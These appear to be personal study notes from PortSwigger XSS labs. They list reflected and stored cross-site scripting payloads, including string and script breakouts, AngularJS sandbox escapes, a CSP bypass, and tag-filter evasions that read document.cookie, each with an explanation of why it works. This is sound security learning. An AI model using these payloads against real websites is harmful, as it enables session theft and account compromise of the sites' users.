# Reflected XSS
- The input we provide is reflected somewhere on the page and if it's not properly filtered we can add HTML content to execute JS functions
```
<script>alert(1)</script>
```
#### Break out of javascript string and execute XSS payload
- Okay this is interesting
![[Pasted image 20220203175418.png]]
- why is there a document.write ??
- anyway, the quotes are getting escaped easily with a backslash so we can use \</script\> to exit out of the script blog of the webpage and start our own script
- The working payload: 
```
</script><script>alert("hello")</script>
```
#### Break out of encoded angle brackets
```
'-alert(1)-'
```
### Break out of javascript strings 
```
'-alert(document.domain)-'  
';alert(document.domain)//
```
**Why this works:**
`';alert(document.domain)//`
gets converted to:
`\';alert(document.domain)//`

`\';alert(document.domain)//`
which gets converted to:
`\\';alert(document.domain)//`
#### Break out of javascript where angle brackets and double quotes are HTML encoded and single quotes are escaped
```
\'-alert(1)- //
```
- The double slashes at the end are probably to comment out the rest of the javascript in that line
### javascript injection in URL using XSS where some characters are blocked
- The payload: 
```
[https://target.website/post?postId=5](https://your-lab-id.web-security-academy.net/post?postId=5&'},x=x=>{throw/\*\*/onerror=alert,1337},toString=x,window+'',{x:'
```
- **Why this works:**
	-   `&`: appends a new parameter to leave the `postId` parameter untouched.
	-   `'}`: breaks out of `body:'/post?postId=1'}`. The code should now look like `fetch('/analytics', {method:'post',body:'/post?postId=5&'}'}).finally(_ => window.location = '/')` : This code/url was exposed when I hovered over **Back to blog** link in the blog post page.
	-   `,x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',`: Is a fancy way to call `alert(1337)` ([Breaking out of a JavaScript string](https://portswigger.net/web-security/cross-site-scripting/contexts)). It basically overwrites the `toString` method and triggers it. `,toString=alert(1337),window+'',` doesn't work, since `(` and `)` are blocked. The `,` separation is important to not break the JavaScript.
	-   `{x:'`: is supplied to not break the JavaScript.
### Break out of Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
- Template literals are used to display the search query: 
![[Pasted image 20220204152942.png]]
- The payload: 
```
${alert(1)}
```
### Angular JS app where the input is under `ng-app` directive
- Even if angle brackets are filtered, we can use double curly braces to execute our XSS payload
```
{{$on.constructor('alert(1)')()}}
```
### Breaking out of AngularJS sandbox
```
https://your-lab-id.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
**Why this works:**
- The exploit uses `toString()` to create a string without using quotes. It then gets the `String` prototype and overwrites the `charAt` function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the `orderBy` filter. We then set the argument for the filter by again using `toString()` to create a string and the `String` constructor property. Finally, we use the `fromCharCode` method generate our payload by converting character codes into the string `x=alert(1)`. Because the `charAt` function has been overwritten, AngularJS will allow this code where normally it would not.
#### AngularJS sandbox and bypassing CSP
The payload:
```
search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
### Reflected XSS where all tags are blocked except the custom tags
```
?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x
<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x
```
- the `#x` in the end makes the window focus on the the element with id `x` immediately after it loads which triggers the onfocus event inside the tag and executes the payload
### Reflected XSS where `href` attributes and certain tags are not allowed
- The payload: 
```
http://target.com/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```
### Reflected XSS with SVG markup allowed
- The payload: 
```
https://your-lab-id.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```
- Obtained after bruteforcing tags and events with Burpsuite Intruder
### Reflected XSS where angle brackets/quotes/double quotes are HTML encoded
- The payload: 
```
"onmouseover="alert(1)
```
- Hovering the mouse over the injected payload/input field triggers the exploit
### Escaping `href` attribute if quotes are HTML encoded
- The payload
```
javascript:alert(document.domain)
```

### Some other labs that I couldn't complete because I didn't have Burpsuite Pro:
- https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack
- https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack
- https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass

# Stored XSS
- The input we provide is stored somewhere on the server and is triggered only when someone views the content containing our input
### Break out of Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
The payload: 
```
http://foo?&apos;-alert(1)-&apos
```
**Why this works:**
	- It's being inserted into the 'website' input field, which can be triggered by clicking on the name of the author, which has an onclick attribute: 
	```
	onclick=...some javascript...('http://website.com/')
	```
	- So instead of a proper website name, the first `&apos` in the payload terminates the string and then the rest of it is executed as a separate javascript function.
### Stored XSS where angle brackets are encoded 
- The payload: 
```
<><img src=x onerror=alert(document.domain)>
```
**Why this works**
- The javascript `replace()` function was being used to replace the angle brackets with their encoded symbols
- However, in case of multiple occurences of angle brackets, the `replace()` function only replaces the first occurence, so after a pair of angle brackets we can easily use our payload